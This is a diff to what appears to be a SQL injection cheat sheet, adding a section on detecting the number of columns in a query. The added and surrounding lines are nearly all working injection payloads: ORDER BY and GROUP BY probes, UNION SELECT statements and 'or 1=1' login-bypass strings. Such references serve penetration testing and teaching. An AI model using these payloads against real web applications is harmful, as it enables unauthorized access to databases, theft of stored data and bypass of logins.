@@ -86,7 +86,28 @@ user' or 1=1;#
 user' or 1=1 LIMIT 1;#
 user' or 1=1 LIMIT 0,1;#    
 ```
-## Union-Based SQL
+
+# Detecting number of columns
+```
+Two methods are typically used for this purpose:
+Order/Group by
+Keep incrementing the number until you get a False response. 
+Even though GROUP BY and ORDER BY have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.
+
+1' ORDER BY 1--+    #True
+1' ORDER BY 2--+    #True
+1' ORDER BY 3--+    #True
+1' ORDER BY 4--+    #False - Query is only using 3 columns
+                        #-1' UNION SELECT 1,2,3--+    True
+                        
+1' GROUP BY 1--+    #True
+1' GROUP BY 2--+    #True
+1' GROUP BY 3--+    #True
+1' GROUP BY 4--+    #False - Query is only using 3 columns
+                        #-1' UNION SELECT 1,2,3--+    True   
+```
+
+# Union-Based SQL
 ```
 ' ORDER BY 3 --
 ' UNION SELECT 1,2,3 -- -	
@@ -115,6 +136,7 @@ user' or 1=1 LIMIT 0,1;#
     
     and incrementing specified column index until an error occurs.
 ```
+
 ## 2. Finding vulnerable columns with union operator :
 ```
   Submit a series of UNION SELECT payloads.
